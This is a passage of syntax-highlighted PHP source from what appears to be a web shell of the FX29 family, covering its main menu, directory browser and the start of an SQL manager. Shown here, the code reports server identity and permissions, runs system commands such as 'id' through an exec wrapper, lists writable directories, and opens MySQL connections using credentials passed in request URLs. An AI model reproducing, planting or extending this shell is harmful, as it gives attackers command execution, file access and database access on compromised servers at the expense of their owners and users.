<span class="lineno"> 367</span>   <span class="nv">$wd</span> <span class="o">=</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">?</span> <span class="s1">&#39;&lt;font class=&quot;on&quot;&gt;[W]&lt;/font&gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&lt;font class=&quot;off&quot;&gt;[R]&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 368</span>   <span class="c1">###########################</span>
<span class="lineno"> 369</span>   <span class="c1">###[ HTML START ]###</span>
<span class="lineno"> 370</span>   <span class="c1">###########################</span>
<span class="lineno"> 371</span>   <span class="k">echo</span> <span class="nx">html_style</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 372</span> 
<span class="lineno"> 373</span> 
<span class="lineno"> 374</span> <span class="x">&lt;!-- Main Menu --&gt;</span>
<span class="lineno"> 375</span> <span class="x">&lt;div id=&quot;main&quot;&gt;</span>
<span class="lineno"> 376</span> <span class="x">    &lt;div class=&quot;bartitle&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">html_header</span><span class="p">()</span> <span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="lineno"> 377</span> <span class="x">    &lt;table id=&quot;pagebar&quot;&gt;</span>
<span class="lineno"> 378</span> <span class="x">        &lt;!-- Server Info --&gt;</span>
<span class="lineno"> 379</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;</span>
<span class="lineno"> 380</span> <span class="x">        &lt;div class=&quot;fleft&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$hsafemode</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="lineno"> 381</span> <span class="x">        &lt;div class=&quot;fright&quot;&gt;</span>
<span class="lineno"> 382</span> <span class="x">            IP Address: &lt;a href=\&quot;http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&lt;/a&gt;</span>
<span class="lineno"> 383</span> <span class="x">            You: &lt;a href=\&quot;http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/a&gt;</span>
<span class="lineno"> 384</span> <span class="x">        &lt;/div&gt;</span>
<span class="lineno"> 385</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 386</span> <span class="x">        &lt;tr&gt;&lt;td width=&quot;50%&quot;&gt;</span>
<span class="lineno"> 387</span> <span class="x">        &lt;table class=&quot;info&quot;&gt;</span>
<span class="lineno"> 388</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 389</span>   <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Software&quot;</span><span class="p">,</span><span class="nx">srv_software</span><span class="p">(</span><span class="nv">$surl</span><span class="p">));</span>
<span class="lineno"> 390</span>   <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Uname&quot;</span><span class="p">,</span><span class="nb">php_uname</span><span class="p">());</span>
<span class="lineno"> 391</span>   <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;User&quot;</span><span class="p">,(</span><span class="nx">is_windows</span><span class="p">())</span> <span class="o">?</span> <span class="nb">get_current_user</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (uid=&quot;</span><span class="o">.</span><span class="nb">getmyuid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; gid=&quot;</span><span class="o">.</span><span class="nb">getmygid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span> <span class="o">:</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">));</span>
<span class="lineno"> 392</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 393</span> 
<span class="lineno"> 394</span> 
<span class="lineno"> 395</span> <span class="x">        &lt;/table&gt;</span>
<span class="lineno"> 396</span> <span class="x">        &lt;/td&gt;</span>
<span class="lineno"> 397</span> <span class="x">        &lt;td width=&quot;50%&quot;&gt;</span>
<span class="lineno"> 398</span> <span class="x">        &lt;table class=&quot;info&quot;&gt;</span>
<span class="lineno"> 399</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 400</span>   <span class="k">if</span> <span class="p">(</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Drives&quot;</span><span class="p">,</span><span class="nx">disp_drives</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$surl</span><span class="p">));</span> <span class="p">}</span>
<span class="lineno"> 401</span>   <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Freespace&quot;</span><span class="p">,</span><span class="nx">disp_freespace</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
<span class="lineno"> 402</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 403</span> 
<span class="lineno"> 404</span> 
<span class="lineno"> 405</span> <span class="x">        &lt;/table&gt;</span>
<span class="lineno"> 406</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 407</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;</span>
<span class="lineno"> 408</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 409</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">get_status</span><span class="p">();</span>
<span class="lineno"> 410</span>   <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 411</span>   <span class="k">echo</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$safemodeexecdir</span><span class="p">))</span> <span class="o">?</span> <span class="s2">&quot;</span><span class="se">\n\t\t\t</span><span class="s2">SafemodeExecDir: &quot;</span><span class="o">.</span><span class="nv">$safemodeexecdir</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 412</span>   <span class="k">echo</span> <span class="p">(</span><span class="nx">showdisfunc</span><span class="p">())</span> <span class="o">?</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">DisFunc: &quot;</span><span class="o">.</span><span class="nx">showdisfunc</span><span class="p">()</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 413</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 414</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 415</span> 
<span class="lineno"> 416</span> 
<span class="lineno"> 417</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 418</span> <span class="x">        &lt;!-- End of Server Info --&gt;</span>
<span class="lineno"> 419</span> <span class="x">        &lt;!-- Quicklaunch --&gt;</span>
<span class="lineno"> 420</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;2&quot; class=&quot;quicklaunch&quot;&gt;</span>
<span class="lineno"> 421</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 422</span>   <span class="c1">###[ QUICKLAUNCH ]###</span>
<span class="lineno"> 423</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$quicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 424</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;-&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 425</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 426</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;tr&gt;&lt;td colspan=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">quicklaunch</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 427</span>     <span class="p">}</span>
<span class="lineno"> 428</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 429</span>       <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%d&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 430</span>       <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 431</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;..&quot;</span><span class="p">);</span>
<span class="lineno"> 432</span>       <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 433</span>         <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 434</span>         <span class="nb">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno"> 435</span>         <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
<span class="lineno"> 436</span>       <span class="p">}</span>
<span class="lineno"> 437</span>       <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%upd&quot;</span><span class="p">,</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">),</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 438</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 439</span>     <span class="p">}</span>
<span class="lineno"> 440</span>   <span class="p">}</span>
<span class="lineno"> 441</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 442</span> 
<span class="lineno"> 443</span> 
<span class="lineno"> 444</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 445</span> <span class="x">        &lt;!-- End of Quicklaunch --&gt;</span>
<span class="lineno"> 446</span> <span class="x">        &lt;!-- Directory Info --&gt;</span>
<span class="lineno"> 447</span> <span class="x">        &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;</span>
<span class="lineno"> 448</span> <span class="x">        &lt;div class=&quot;fleft&quot;&gt;</span>
<span class="lineno"> 449</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 450</span>   <span class="nv">$pd</span> <span class="o">=</span> <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
<span class="lineno"> 451</span>   <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 452</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$pd</span> <span class="k">as</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 453</span>     <span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 454</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$e</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 455</span>       <span class="nv">$t</span><span class="o">.=</span> <span class="nv">$r</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
<span class="lineno"> 456</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">==</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 457</span>       <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 458</span>     <span class="p">}</span>
<span class="lineno"> 459</span>     <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 460</span>     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 461</span>   <span class="p">}</span>
<span class="lineno"> 462</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 463</span>   <span class="k">echo</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">?</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&quot;</span> <span class="o">:</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 464</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 465</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 466</span> 
<span class="lineno"> 467</span> 
<span class="lineno"> 468</span> <span class="x">        &lt;/div&gt;</span>
<span class="lineno"> 469</span> <span class="x">        &lt;div class=&quot;fright&quot;&gt;</span>
<span class="lineno"> 470</span> <span class="x">        &lt;form name=&quot;f_dir&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno"> 471</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;ls&quot;&gt;</span>
<span class="lineno"> 472</span> <span class="x">            Directory: &lt;input type=&quot;text&quot; name=&quot;d&quot; size=&quot;60&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt; &lt;input type=submit value=&quot;Go&quot;&gt;</span>
<span class="lineno"> 473</span> <span class="x">        &lt;/form&gt;</span>
<span class="lineno"> 474</span> <span class="x">        &lt;/div&gt;</span>
<span class="lineno"> 475</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 476</span> <span class="x">        &lt;!-- End of Directory Info --&gt;</span>
<span class="lineno"> 477</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno"> 478</span> <span class="x">&lt;/div&gt;</span>
<span class="lineno"> 479</span> <span class="x">&lt;!-- End of Main Menu --&gt;</span>
<span class="lineno"> 480</span> <span class="x">&lt;!-- Main Info --&gt;</span>
<span class="lineno"> 481</span> <span class="x">&lt;div id=&quot;maininfo&quot;&gt;</span>
<span class="lineno"> 482</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 483</span>   <span class="c1">#####################################</span>
<span class="lineno"> 484</span>   <span class="c1">###[ INFORMATION TABLE ]###</span>
<span class="lineno"> 485</span>   <span class="c1">#####################################</span>
<span class="lineno"> 486</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nv">$dspact</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 487</span>   <span class="c1">###[ SQL ]###</span>
<span class="lineno"> 488</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;sql&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 489</span>   <span class="nv">$sql_surl</span> <span class="o">=</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">;</span>
<span class="lineno"> 490</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_login</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 491</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_passwd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 492</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_server</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 493</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_port</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 494</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 495</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 496</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 497</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_order</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 498</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 499</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_getfile</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 500</span>     <span class="c1">#SQL URL Setting</span>
<span class="lineno"> 501</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_login</span><span class="p">)</span>  <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 502</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_passwd</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 503</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 504</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_port</span><span class="p">)</span>   <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 505</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span><span class="p">)</span>     <span class="p">{</span> <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 506</span>   <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
<span class="lineno"> 507</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 508</span> 
<span class="lineno"> 509</span> 
<span class="lineno"> 510</span> <span class="x">&lt;!-- SQL Manager --&gt;</span>
<span class="lineno"> 511</span> <span class="x">&lt;div class=&quot;barheader&quot;&gt;.: SQL Manager (Under Construction) :.&lt;/div&gt;</span>
<span class="lineno"> 512</span> <span class="x">&lt;div class=&quot;barheader&quot;&gt;</span><span class="cp">&lt;?php</span>
<span class="lineno"> 513</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 514</span>     <span class="nv">$sql_sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$sql_server</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$sql_port</span><span class="p">,</span> <span class="nv">$sql_login</span><span class="p">,</span> <span class="nv">$sql_passwd</span><span class="p">);</span>
<span class="lineno"> 515</span>     <span class="nv">$err</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 516</span>     <span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 517</span>     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_query</span> <span class="k">and</span> <span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 518</span>       <span class="nv">$sql_query_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 519</span>       <span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 520</span>     <span class="p">}</span>
<span class="lineno"> 521</span>   <span class="p">}</span>
<span class="lineno"> 522</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$sql_sock</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 523</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 524</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No Connection!&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 525</span>     <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;ERROR: &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 526</span>   <span class="p">}</span>
<span class="lineno"> 527</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 528</span>         <span class="c1">#SQL Quicklaunch</span>
<span class="lineno"> 529</span>     <span class="nv">$sqlquicklaunch</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 530</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Index&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
